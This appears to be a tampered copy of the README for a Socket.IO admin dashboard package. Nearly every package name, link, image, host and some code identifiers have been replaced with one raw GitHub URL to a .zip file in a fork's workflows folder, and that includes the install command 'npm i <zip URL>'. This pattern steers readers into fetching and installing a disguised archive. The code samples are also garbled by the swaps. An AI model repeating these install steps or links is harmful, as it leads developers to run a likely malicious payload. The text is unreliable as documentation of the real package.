# https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip Admin UI

![dashboard screenshot](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip)

## Table of contents

- [How to use](#how-to-use)
  - [Server-side](#server-side)
  - [Client-side](#client-side)
- [Available options](#available-options)
  - [`auth`](#auth)
  - [`namespaceName`](#namespacename)
  - [`readonly`](#readonly)
  - [`serverId`](#serverid)
  - [`store`](#store)
  - [`mode`](#mode)
- [How it works](#how-it-works)
- [License](#license)

## How to use

### Server-side

First, install the `https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip` package:

```
npm i https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
```

And then invoke the `instrument` method on your https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip server:

```js
const { createServer } = require("http");
const { Server } = require("https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip");
const { instrument } = require("https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip");

const httpServer = createServer();

const io = new Server(httpServer, {
  cors: {
    origin: ["https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip"],
    credentials: true
  }
});

instrument(io, {
  auth: false
});

https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip(3000);
```

The module is compatible with:

- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip v4 server
- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip v3 server (>= 3.1.0), but without the operations on rooms (join, leave, disconnection)

### Client-side

You can then head up to https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip, or host the files found in the `ui/dist` folder.

**Important note**: the website at https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip is totally static (hosted on [Vercel](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip)), we do not (and will never) store any information about yourself or your browser (no tracking, no analytics, ...). That being said, hosting the files yourself is totally fine.

You should see the following modal:

![login modal screenshot](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip)

Please enter the URL of your server (for example, `http://localhost:3000` or `https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip`) and the credentials, if applicable (see the `auth` option [below](#auth)).

### Available options

#### `auth`

Default value: `-`

This option is mandatory. You can either disable authentication (please use with caution):

```js
instrument(io, {
  auth: false
});
```

Or use basic authentication:

```js
instrument(io, {
  auth: {
    type: "basic",
    username: "admin",
    password: "$2b$10$https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip" // "changeit" encrypted with bcrypt
  },
});
```

WARNING! Please note that the `bcrypt` package does not currently support hashes starting with the `$2y$` prefix, which is used by some BCrypt implementations (for example https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip or https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip). You can check the validity of the hash with:

```
$ node
> require("bcrypt").compareSync("<the password>", "<the hash>")
true
```

You can generate a valid hash with:

```
$ node
> require("bcrypt").hashSync("changeit", 10)
'$2b$10$LQUE...'
```

See also:

- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
- https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip

#### `namespaceName`

Default value: `/admin`

The name of the namespace which will be created to handle the administrative tasks.

```js
instrument(io, {
  namespaceName: "/custom"
});
```

This namespace is a classic https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip namespace, you can access it with:

```js
const adminNamespace = https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip("/admin");
```

More information [here](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip).

#### `readonly`

Default value: `false`

Whether to put the admin UI in read-only mode (no join, leave or disconnect allowed).

```js
instrument(io, {
  readonly: true
});
```

#### `serverId`

Default value: `require("os").hostname()`

The ID of the given server. If you have several https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip servers on the same machine, please give them a distinct ID:

```js
instrument(io, {
  serverId: `${require("os").hostname()}#${https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip}`
});
```

#### `store`

Default value: `new InMemoryStore()`

The store is used to store the session IDs so the user do not have to retype the credentials upon reconnection.

If you use basic authentication in a multi-server setup, you should provide a custom store:

```js
const { instrument, RedisStore } = require("https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip");

instrument(io, {
  store: new RedisStore(redisClient)
});
```

#### `mode`

Default value: `development`

In production mode, the server won't send all details about the socket instances and the rooms, thus reducing the memory footprint of the instrumentation.

```js
instrument(io, {
  mode: "production"
});
```

The production mode can also be enabled with the NODE_ENV environment variable:

```
NODE_ENV=production node https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip
```

## How it works

You can check the details of the implementation in the [https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip) file.

The `instrument` method simply:

- creates a [namespace](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip) and adds an authentication [middleware](https://raw.githubusercontent.com/bro-gervil/socket.io-admin-ui/develop/.github/workflows/ui-io-socket-admin-nowhat.zip) if applicable
- register listeners for the `connection` and `disconnect` event for each existing namespaces to track socket instances
- register a timer which will periodically send stats from the server to the UI
- register handlers for the `join`, `leave` and `_disconnect` commands sent from the UI

## License

MIT
